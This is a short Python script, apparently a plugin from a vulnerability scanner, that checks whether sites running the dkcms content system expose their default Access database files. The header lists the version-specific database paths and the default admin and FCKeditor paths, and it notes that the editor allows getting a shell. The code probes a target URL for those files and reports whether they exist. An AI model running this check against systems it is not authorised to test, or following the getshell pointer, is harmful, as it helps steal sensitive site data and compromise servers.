#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: 动科(dkcms)默认数据库漏洞
referer: http://www.myhack58.com/Article/html/3/62/2013/36692.htm
author: Lucifer
description: dkcms存在默认数据库,可下载查看敏感数据,FCK编辑器可GETSHELL。
            V2.0   data/dkcm_ssdfhwejkfs.mdb
            V3.1   _data/___dkcms_30_free.mdb
            V4.2   _data/I^(()UU()H.mdb
            默认后台：admin
            编辑器：admin/fckeditor
'''
import sys
import requests
import time
import warnings
def run(url):
        result = ['动科(dkcms)默认数据库漏洞','','']
        headers = {
            "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
        }
        payloads = ["/data/dkcm_ssdfhwejkfs.mdb",
                    "/_data/___dkcms_30_free.mdb",
                    "/_data/I^(()UU()H.mdb"]

        try:
            noexist = True
            for payload in payloads:
                vulnurl = url + payload
                req = requests.head(vulnurl, headers=headers, timeout=10, verify=False)
                if req.headers["Content-Type"] == "application/x-msaccess":
                    result[2]=  '存在'
                    result[1] = vulnurl
                    noexist = False
            if noexist:
                result[2]=  '不存在'

        except:
            result[2]='不存在'
        return result

if __name__ == "__main__":
    warnings.filterwarnings("ignore")
    testVuln = run(sys.argv[1])
    